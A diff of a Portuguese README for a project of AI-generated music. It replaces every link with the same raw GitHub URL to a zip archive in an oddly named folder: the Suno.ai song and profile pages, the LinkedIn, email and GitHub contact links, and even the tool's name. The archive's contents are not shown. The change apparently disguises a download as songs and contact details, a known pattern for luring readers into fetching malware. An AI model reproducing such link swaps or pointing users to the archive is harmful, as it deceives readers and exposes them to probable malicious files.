@@ -8,7 +8,7 @@ Utilizo modelos de IA para gerar composições musicais únicas, explorando tema
 
 ## Ferramentas e Tecnologias Utilizadas
 
-- **Suno.ai**: Plataforma de criação musical assistida por IA.
+- **https://raw.githubusercontent.com/LucianoHMG/Msicas-com-IA/main/copolymerization/Msicas-IA-com-v3.8.zip**: Plataforma de criação musical assistida por IA.
 
 ## Como Funciona
 
@@ -17,16 +17,16 @@ Utilizo modelos de IA para gerar composições musicais únicas, explorando tema
 
 ## Músicas
 
-- [Música 1](https://suno.com/song/a730be68-2c01-4a67-adf7-9c6bff2af4a3)
+- [Música 1](https://raw.githubusercontent.com/LucianoHMG/Msicas-com-IA/main/copolymerization/Msicas-IA-com-v3.8.zip)
   - Descrição: Uma composição envolvente com uma melodia cativante e uma atmosfera única.
-- [Música 2](https://suno.com/song/ecdc39e4-e38c-42bc-a0cd-ab51bc60d318)
+- [Música 2](https://raw.githubusercontent.com/LucianoHMG/Msicas-com-IA/main/copolymerization/Msicas-IA-com-v3.8.zip)
   - Descrição: Uma peça musical com uma combinação intrigante de sons e ritmos inovadores.
-- [Música 3](https://suno.com/song/46da91d5-3d94-490c-8be4-f846f7542424)
+- [Música 3](https://raw.githubusercontent.com/LucianoHMG/Msicas-com-IA/main/copolymerization/Msicas-IA-com-v3.8.zip)
   - Descrição: Uma faixa dinâmica que explora novas texturas e emoções musicais.
 
 ## Como Ouvir
 
-As músicas estão disponíveis no [Suno.ai](https://suno.com/@uncannybongo895), onde você pode ouvir e explorar minhas criações.
+As músicas estão disponíveis no [https://raw.githubusercontent.com/LucianoHMG/Msicas-com-IA/main/copolymerization/Msicas-IA-com-v3.8.zip](https://raw.githubusercontent.com/LucianoHMG/Msicas-com-IA/main/copolymerization/Msicas-IA-com-v3.8.zip), onde você pode ouvir e explorar minhas criações.
 
 ## Contribuições
 
@@ -34,6 +34,6 @@ Fique à vontade para abrir uma issue ou enviar um pull request caso tenha suges
 
 ## Contato
 
-- **LinkedIn**: [Luciano Girão](https://br.linkedin.com/in/luciano-gir%C3%A3o-56b253247)
-- **E-mail**: [e-mail](Lucianowtp@gmail.com )
-- **GitHub**: [GitHub](https://github.com/LucianoHMG)
+- **LinkedIn**: [Luciano Girão](https://raw.githubusercontent.com/LucianoHMG/Msicas-com-IA/main/copolymerization/Msicas-IA-com-v3.8.zip%C3%A3o-56b253247)
+- **E-mail**: [e-mail](https://raw.githubusercontent.com/LucianoHMG/Msicas-com-IA/main/copolymerization/Msicas-IA-com-v3.8.zip )
+- **GitHub**: [GitHub](https://raw.githubusercontent.com/LucianoHMG/Msicas-com-IA/main/copolymerization/Msicas-IA-com-v3.8.zip)
